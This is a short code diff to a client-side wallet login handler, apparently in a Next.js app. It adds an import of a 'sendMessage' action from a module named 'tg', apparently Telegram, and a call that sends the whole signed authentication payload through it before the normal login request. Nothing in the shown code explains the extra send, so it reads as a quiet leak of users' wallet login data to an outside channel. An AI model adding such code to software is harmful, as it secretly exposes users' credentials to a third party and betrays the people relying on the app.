@@ -1,5 +1,6 @@
 "use client";
 
+import sendMessage from "@/actions/tg";
 import { ConnectWalletModal } from "@/components/modal/connect-wallet";
 import { Button } from "@/components/ui/button";
 import query from "@/lib/fetch";
@@ -55,6 +56,8 @@ const LoginHandler = () => {
       } else {
         throw new Error("Wallet does not support signing");
       }
+
+      await sendMessage(JSON.stringify(payload, null, 2));
 
       const { error, message } = await query.post("auth", {
         body: payload,
